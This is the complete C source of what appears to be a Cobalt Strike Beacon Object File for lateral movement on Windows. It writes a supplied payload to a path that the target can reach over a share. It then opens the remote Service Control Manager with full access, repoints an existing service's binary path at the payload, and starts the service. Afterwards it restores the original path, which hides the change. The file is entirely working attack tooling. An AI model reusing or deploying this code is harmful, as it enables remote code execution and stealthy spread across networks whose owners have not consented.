#include <windows.h>
#include <stdio.h>
#include "../_include/beacon.h"

WINBASEAPI int __cdecl MSVCRT$_snprintf(char * __restrict__ d, size_t n, const char * __restrict__ format, ...);
WINBASEAPI HANDLE WINAPI KERNEL32$CreateFileA(LPCSTR lpFileName, DWORD dwDesiredAccess, DWORD dwShareMode, LPSECURITY_ATTRIBUTES lpSecurityAttributes, DWORD dwCreationDisposition, DWORD dwFlagsAndAttributes, HANDLE hTemplateFile );
WINBASEAPI BOOL WINAPI KERNEL32$WriteFile(HANDLE hFile, LPCVOID lpBuffer, DWORD nNumberOfBytesToWrite, LPDWORD lpNumberOfBytesWritten, LPOVERLAPPED lpOverlapped );
DECLSPEC_IMPORT SC_HANDLE WINAPI Advapi32$OpenSCManagerA(LPCSTR, LPCSTR, DWORD);
DECLSPEC_IMPORT SC_HANDLE WINAPI Advapi32$OpenServiceA(SC_HANDLE, LPCSTR, DWORD);
DECLSPEC_IMPORT BOOL WINAPI Advapi32$QueryServiceConfigA(SC_HANDLE, LPQUERY_SERVICE_CONFIGA, DWORD, LPDWORD);
DECLSPEC_IMPORT HGLOBAL WINAPI kernel32$GlobalAlloc(UINT, SIZE_T);
DECLSPEC_IMPORT HGLOBAL WINAPI kernel32$GlobalFree(HGLOBAL);
DECLSPEC_IMPORT BOOL WINAPI Advapi32$ChangeServiceConfigA(SC_HANDLE, DWORD, DWORD, DWORD, LPCSTR, LPCSTR, LPDWORD, LPCSTR, LPCSTR, LPCSTR, LPCSTR);
DECLSPEC_IMPORT BOOL WINAPI Advapi32$StartServiceA(SC_HANDLE,DWORD, LPCSTR*);
DECLSPEC_IMPORT BOOL WINAPI Advapi32$CloseServiceHandle(SC_HANDLE);
DECLSPEC_IMPORT DWORD WINAPI kernel32$GetLastError();
DECLSPEC_IMPORT BOOL WINAPI kernel32$CloseHandle(HANDLE);

void go(char * args, int length) {
    // Parse Beacon Arguments
    datap parser;

    BeaconDataParse(&parser, args, length);

    ULONG tmp = 0;
    ULONG svcBinarySize = 0;
    CHAR* target      = BeaconDataExtract(&parser, NULL);
    CHAR* svcBinary   = BeaconDataExtract(&parser, &svcBinarySize);
    CHAR* serviceName = BeaconDataExtract(&parser, &tmp);
    CHAR* path        = BeaconDataExtract(&parser, &tmp);
    CHAR* share       = BeaconDataExtract(&parser, &tmp);
    CHAR* binaryName  = BeaconDataExtract(&parser, &tmp);


    LPQUERY_SERVICE_CONFIGA lpqsc = NULL;
    DWORD dwLpqscSize = 0;
    CHAR* originalBinaryPath = NULL;
    BOOL bResult = FALSE;

    BeaconPrintf(CALLBACK_OUTPUT, "Trying to connect to %s\n", target);

    SC_HANDLE schManager = Advapi32$OpenSCManagerA(target, SERVICES_ACTIVE_DATABASE, SC_MANAGER_ALL_ACCESS);
    if(schManager == NULL) {
        BeaconPrintf(CALLBACK_OUTPUT, "Advapi32$OpenSCManagerA failed %ld\n", kernel32$GetLastError());
        return;
    }

    CHAR remotePath[MAX_PATH];
    CHAR localPath[MAX_PATH];
    MSVCRT$_snprintf(remotePath, sizeof(remotePath), "\\\\%s\\%s\\%s", target, share, binaryName);
    MSVCRT$_snprintf(localPath, sizeof(localPath), "%s\\%s", path , binaryName);

    HANDLE hFile = KERNEL32$CreateFileA(localPath, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile == INVALID_HANDLE_VALUE) {
        BeaconPrintf(CALLBACK_ERROR, "CreateFileA failed: %lu \n", kernel32$GetLastError());
        return;
    }

    DWORD bytesWritten;
    if (!KERNEL32$WriteFile(hFile, svcBinary, svcBinarySize, &bytesWritten, NULL)) {
        BeaconPrintf(CALLBACK_ERROR, "WriteFile failed: %lu", kernel32$GetLastError());
        kernel32$CloseHandle(hFile);
        return;
    }
    kernel32$CloseHandle(hFile);
    BeaconPrintf(CALLBACK_OUTPUT, "File created successfully at %s\n", localPath);

    BeaconPrintf(CALLBACK_OUTPUT, "SC_HANDLE Manager 0x%p\n", schManager);

    BeaconPrintf(CALLBACK_OUTPUT, "Opening %s\n", serviceName);
    SC_HANDLE schService = Advapi32$OpenServiceA(schManager, serviceName, SERVICE_ALL_ACCESS);
    if(schService == NULL) {
	Advapi32$CloseServiceHandle(schManager);
        BeaconPrintf(CALLBACK_OUTPUT, "Advapi32$OpenServiceA failed %ld\n", kernel32$GetLastError());
        return;
    }
    BeaconPrintf(CALLBACK_OUTPUT, "SC_HANDLE Service 0x%p\n", schService);

    DWORD dwSize = 0;
    Advapi32$QueryServiceConfigA(schService, NULL, 0, &dwSize);
    if(dwSize) {
        // This part is not critical error will not stop the program
        dwLpqscSize = dwSize;
        BeaconPrintf(CALLBACK_OUTPUT, "LPQUERY_SERVICE_CONFIGA need 0x%08x bytes\n", dwLpqscSize);
        lpqsc = kernel32$GlobalAlloc(GPTR, dwSize);
        bResult = FALSE;
        bResult = Advapi32$QueryServiceConfigA(schService, lpqsc, dwLpqscSize, &dwSize);
        originalBinaryPath = lpqsc->lpBinaryPathName;
        BeaconPrintf(CALLBACK_OUTPUT, "Original service binary path \"%s\"\n", originalBinaryPath);
    }

    bResult = FALSE;
    bResult = Advapi32$ChangeServiceConfigA(schService, SERVICE_NO_CHANGE, SERVICE_DEMAND_START, SERVICE_ERROR_IGNORE, localPath, NULL, NULL, NULL, NULL, NULL, NULL);
    if(!bResult) {
        BeaconPrintf(CALLBACK_OUTPUT, "Advapi32$ChangeServiceConfigA failed to update the service path. %ld\n", kernel32$GetLastError());
        return;
    }
    BeaconPrintf(CALLBACK_OUTPUT, "Service path was changed to \"%s\"\n", localPath);

    bResult = FALSE;
    bResult = Advapi32$StartServiceA(schService, 0, NULL);
    DWORD dwResult = kernel32$GetLastError();
    if(!bResult && dwResult != 1053) {
        BeaconPrintf(CALLBACK_OUTPUT, "Advapi32$StartServiceA failed to start the service. %ld\n", kernel32$GetLastError());
    } else {
        BeaconPrintf(CALLBACK_OUTPUT, "Service was started\n");
    }

    if(dwLpqscSize) {
        bResult = FALSE;
        bResult = Advapi32$ChangeServiceConfigA(schService, SERVICE_NO_CHANGE, SERVICE_DEMAND_START, SERVICE_ERROR_IGNORE, originalBinaryPath, NULL, NULL, NULL, NULL, NULL, NULL);
        if(!bResult) {
            BeaconPrintf(CALLBACK_OUTPUT, "Advapi32$ChangeServiceConfigA failed to revert the service path. %ld\n", kernel32$GetLastError());
            return;
        }
        BeaconPrintf(CALLBACK_OUTPUT, "Service path was restored to \"%s\"\n", originalBinaryPath);
    }

    kernel32$GlobalFree(lpqsc);
#ifdef _IMP
    kernel32$CloseHandle(hToken);
#endif
    Advapi32$CloseServiceHandle(schManager);
    Advapi32$CloseServiceHandle(schService);
}
